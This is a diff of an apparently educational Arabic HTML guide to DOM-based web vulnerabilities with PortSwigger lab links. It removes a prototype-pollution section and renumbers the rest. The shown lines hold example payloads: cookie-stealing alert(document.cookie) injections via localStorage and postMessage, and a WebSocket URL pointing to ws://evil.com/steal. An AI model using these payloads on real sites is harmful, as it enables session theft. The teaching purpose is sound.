@@ -259,23 +259,7 @@ if (window.someFunction) {
                 </div>
 
                 <div class="card">
-                    <h3>🧬 5. DOM-based Prototype Pollution</h3>
-                    <p><strong>التعريف:</strong> تلويث prototype chain للكائنات JavaScript.</p>
-                    <p><strong>المصدر:</strong> JSON.parse, Object.assign</p>
-                    <p><strong>التأثير:</strong> تنفيذ كود، تعديل السلوك</p>
-                    <div class="code-block">
-<span class="code-header"><i class="fas fa-code"></i> مثال</span>
-<pre><code>// الكود الضعيف
-var userData = JSON.parse(userInput);
-Object.assign(target, userData);
-
-// الاستغلال
-{"__proto__": {"isAdmin": true}}</code></pre>
-                    </div>
-                </div>
-
-                <div class="card">
-                    <h3>💾 6. DOM-based LocalStorage/SessionStorage Poisoning</h3>
+                    <h3>💾 5. DOM-based LocalStorage/SessionStorage Poisoning</h3>
                     <p><strong>التعريف:</strong> حقن بيانات خبيثة في مخازن المتصفح المحلية.</p>
                     <p><strong>المصدر:</strong> localStorage, sessionStorage</p>
                     <p><strong>التأثير:</strong> سرقة البيانات، تنفيذ كود خبيث</p>
@@ -292,7 +276,7 @@ localStorage.setItem('userData', 'alert(document.cookie)');</code></pre>
                 </div>
 
                 <div class="card">
-                    <h3>📨 7. DOM-based postMessage Manipulation</h3>
+                    <h3>📨 6. DOM-based postMessage Manipulation</h3>
                     <p><strong>التعريف:</strong> استغلال رسائل postMessage بين النوافذ.</p>
                     <p><strong>المصدر:</strong> window.postMessage</p>
                     <p><strong>التأثير:</strong> سرقة البيانات، تنفيذ كود</p>
@@ -311,7 +295,7 @@ window.postMessage('alert(document.cookie)', '*');</code></pre>
                 </div>
 
                 <div class="card">
-                    <h3>🔌 8. DOM-based WebSocket URL Poisoning</h3>
+                    <h3>🔌 7. DOM-based WebSocket URL Poisoning</h3>
                     <p><strong>التعريف:</strong> تسميم عنوان URL لاتصال WebSocket.</p>
                     <p><strong>المصدر:</strong> URL parameters, user input</p>
                     <p><strong>التأثير:</strong> تسريب البيانات، هجمات MITM</p>
@@ -327,7 +311,7 @@ https://site.com/page?ws=ws://evil.com/steal</code></pre>
                 </div>
 
                 <div class="card">
-                    <h3>🍪 9. DOM-based Cookie Manipulation</h3>
+                    <h3>🍪 8. DOM-based Cookie Manipulation</h3>
                     <p><strong>التعريف:</strong> التلاعب بملفات تعريف الارتباط من خلال DOM.</p>
                     <p><strong>المصدر:</strong> document.cookie</p>
                     <p><strong>التأثير:</strong> سرقة الجلسات، التصيد</p>
@@ -394,14 +378,6 @@ https://site.com/page#malicious-session-id</code></pre>
                         <td>Browser DevTools, Manual Testing</td>
                     </tr>
                     <tr>
-                        <td><strong>Prototype Pollution</strong></td>
-                        <td>JSON, Object.assign</td>
-                        <td>تلويث prototype</td>
-                        <td>تعديل السلوك</td>
-                        <td>صعب جداً</td>
-                        <td>Prototype Pollution Scanner</td>
-                    </tr>
-                    <tr>
                         <td><strong>LocalStorage Poisoning</strong></td>
                         <td>localStorage API</td>
                         <td>حقن بيانات خبيثة</td>
@@ -443,7 +419,6 @@ https://site.com/page#malicious-session-id</code></pre>
                     <li><strong>Open Redirect:</strong> ابحث عن <code>window.location</code>, <code>location.href</code></li>
                     <li><strong>Template Injection:</strong> ابحث عن محركات قوالب مثل AngularJS, Handlebars</li>
                     <li><strong>DOM Clobbering:</strong> ابحث عن استخدام <code>window.elementName</code></li>
-                    <li><strong>Prototype Pollution:</strong> ابحث عن <code>Object.assign</code>, <code>JSON.parse</code></li>
                     <li><strong>Storage Poisoning:</strong> ابحث عن <code>localStorage</code>, <code>sessionStorage</code></li>
                     <li><strong>postMessage:</strong> ابحث عن <code>addEventListener('message')</code></li>
                     <li><strong>WebSocket:</strong> ابحث عن <code>new WebSocket()</code></li>
@@ -550,7 +525,7 @@ sequenceDiagram
         </section>
 
         <section id="labs">
-            <h2><i class="fas fa-flask"></i> مختبرات عملية (9) - PortSwigger Academy</h2>
+            <h2><i class="fas fa-flask"></i> مختبرات عملية (8) - PortSwigger Academy</h2>
             <p>مختبرات متدرجة الصعوبة لكل نوع من أنواع ثغرات DOM-based:</p>
 
             <h3>🎯 مختبرات DOM-based XSS</h3>
@@ -593,19 +568,9 @@ sequenceDiagram
                 </a>
             </div>
 
-            <h3>🧬 مختبرات Prototype Pollution</h3>
-            <div class="lab-card">
-                <h4>🧪 Lab 5: Client-side prototype pollution</h4>
-                <p><strong>الهدف:</strong> استغلال prototype pollution في جانب العميل</p>
-                <p><strong>التقنية:</strong> تلويث prototype chain</p>
-                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-prototype-pollution" class="lab-link" target="_blank">
-                    <i class="fas fa-external-link-alt"></i> فتح المختبر
-                </a>
-            </div>
-
             <h3>💾 مختبرات LocalStorage/SessionStorage Poisoning</h3>
             <div class="lab-card">
-                <h4>🧪 Lab 6: DOM-based localStorage poisoning</h4>
+                <h4>🧪 Lab 5: DOM-based localStorage poisoning</h4>
                 <p><strong>الهدف:</strong> استغلال localStorage لتخزين بيانات خبيثة</p>
                 <p><strong>التقنية:</strong> حقن كود JavaScript في localStorage</p>
                 <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink" class="lab-link" target="_blank">
@@ -615,7 +580,7 @@ sequenceDiagram
 
             <h3>📨 مختبرات postMessage Manipulation</h3>
             <div class="lab-card">
-                <h4>🧪 Lab 7: DOM-based postMessage manipulation</h4>
+                <h4>🧪 Lab 6: DOM-based postMessage manipulation</h4>
                 <p><strong>الهدف:</strong> استغلال رسائل postMessage بين النوافذ</p>
                 <p><strong>التقنية:</strong> إرسال رسائل خبيثة عبر postMessage</p>
                 <a href="https://portswigger.net/web-security/dom-based/controlling-the-web-message-source" class="lab-link" target="_blank">
@@ -625,7 +590,7 @@ sequenceDiagram
 
             <h3>🔌 مختبرات WebSocket URL Poisoning</h3>
             <div class="lab-card">
-                <h4>🧪 Lab 8: DOM-based WebSocket URL poisoning</h4>
+                <h4>🧪 Lab 7: DOM-based WebSocket URL poisoning</h4>
                 <p><strong>الهدف:</strong> تسميم عنوان URL لاتصال WebSocket</p>
                 <p><strong>التقنية:</strong> توجيه WebSocket لخادم ضار</p>
                 <a href="https://portswigger.net/web-security/dom-based/websocket-url-poisoning" class="lab-link" target="_blank">
@@ -635,7 +600,7 @@ sequenceDiagram
 
             <h3>🍪 مختبرات Cookie Manipulation</h3>
             <div class="lab-card">
-                <h4>🧪 Lab 9: DOM-based cookie manipulation</h4>
+                <h4>🧪 Lab 8: DOM-based cookie manipulation</h4>
                 <p><strong>الهدف:</strong> التلاعب بملفات تعريف الارتباط من خلال DOM</p>
                 <p><strong>التقنية:</strong> تعديل cookies عبر JavaScript</p>
                 <a href="https://portswigger.net/web-security/dom-based/cookie-manipulation" class="lab-link" target="_blank">
